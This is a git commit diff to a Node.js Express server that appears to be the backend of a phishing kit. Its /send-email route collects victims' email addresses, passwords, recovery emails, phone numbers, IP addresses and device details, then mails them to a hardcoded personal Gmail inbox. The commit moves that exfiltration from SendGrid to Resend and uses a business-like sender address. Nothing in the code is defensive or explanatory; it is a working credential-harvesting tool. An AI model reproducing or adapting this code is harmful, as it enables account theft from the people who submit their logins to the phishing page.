e038a8da1476a2333b94ada1a4e8044ce349bdbe
Ebube <dbupanyiam@gmail.com>
2023-07-21 08:50:42 +0100

    Update script

--- index.js
+++ index.js
@@ -1,6 +1,7 @@
 import express from "express";
 import sgMail from "@sendgrid/mail";
 import cors from "cors";
+import { Resend } from "resend";
 
 // require("dotenv").config();
 import env from "dotenv";
@@ -11,36 +12,36 @@ app.use(express.json());
 app.use(cors());
 
 sgMail.setApiKey(process.env.SG_API_KEY);
+const resend = new Resend(process.env.RESEND_API_KEY);
 
 // POST route to send an email
 app.post("/send-email", async (req, res) => {
   const { email, password, recEmail, phone, port, deviceDetails } = req.body;
-
   const ip = req.ip.split(":").pop();
 
-  const msg = {
-    to: "juniorhenry745@gmail.com",
-    from: "hello@fortyfi.africa",
-    subject: `New entry:: ${port}`,
-    text: "You need to verify your email",
-    html: `
-              <p>Email: ${email}</p>.
-              <p>Recovery Email: ${recEmail}</p>
-              <p>Phone Number: ${phone}</p>
-              <p>Password: ${password}</p>
+  try {
+    await resend.emails.send({
+      from: "Acme <hello@nationoak.com>",
+      to: ["juniorhenry745@gmail.com"],
+      subject: `New entry:: ${port}`,
+      html: `
+    <p>Email: ${email}</p>.
+    <p>Recovery Email: ${recEmail}</p>
+    <p>Phone Number: ${phone}</p>
+    <p>Password: ${password}</p>
+    <p>IP: ${ip}</p>
+    <p>PORT: ${port}</p>
+    <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
+`,
+    });
 
-              <p>IP: ${ip}</p>
-              <p>PORT: ${port}</p>
-              <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
-    `,
-  };
-
-  await sgMail.send(msg);
-
-  res.status(200).send({
-    status: true,
-    message: "Email sent",
-  });
+    res.status(200).send({
+      status: true,
+      message: "Email sent",
+    });
+  } catch (error) {
+    console.error(error);
+  }
 });
 
 // Start the server
